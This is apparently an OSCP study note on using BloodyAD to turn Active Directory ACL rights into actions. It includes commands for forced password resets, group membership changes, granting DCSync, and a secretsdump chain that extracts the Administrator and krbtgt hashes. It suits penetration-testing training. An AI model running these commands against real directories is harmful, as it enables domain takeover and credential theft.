---
status: working
tags:
  - tooling
  - active-directory
  - acl-abuse
---
> *BloodyAD:* The "BloodHound showed me an ACL edge, now execute it" tool, run remotely from Kali. Its specialty is turning a directory-object write right (`GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`, `AddMember`) into a concrete action over LDAP, with one consistent syntax. It is the from-Kali counterpart to on-host PowerView. This note drives the tool, the edges themselves are decoded in [[03E - AD Attacks]].

## Install (no compilation, it's Python)

```bash
pipx install bloodyAD
```

## Auth and Base Invocation

Works with a password, an NTLM hash (pass-the-hash), or Kerberos. The base is always:

```bash
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> <action>
```

Swap `-p 'pass'` for `-p :<NTLM>` to use a hash, or add `-k` for Kerberos.

## Commands

```bash
# always start here: what am I allowed to write?
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> get writable
# ForceChangePassword / GenericAll on a user
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> set password targetuser 'NewPass123!'
# AddMember / GenericAll on a group
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> add groupMember "Target Group" youruser
# WriteDACL on the domain -> grant yourself DCSync
bloodyAD -u user -p 'pass' -d corp.com --host <DC-IP> add dcsync youruser
```

> [!note] OSCP-level chain
> BloodHound shows `youruser —WriteDACL→ DOMAIN`. Run `bloodyAD ... add dcsync youruser`, then dump the domain from Kali: `impacket-secretsdump -just-dc corp.com/youruser:'pass'@<DC-IP>` ([[03F - AD Lateral Movements & Persistence]]) → Administrator + krbtgt hashes → pass-the-hash into the DC. A full WriteDACL → domain owned chain in two commands.

## See Also

- [[03E - AD Attacks]] for the rights decoder and PowerView equivalents
- [[11B - Rubeus]] for the on-host Kerberos counterpart
- [[03D - AD Enumeration]] for the BloodHound edges this executes
- Source: [[OSCP Field Manual]] section 7.6
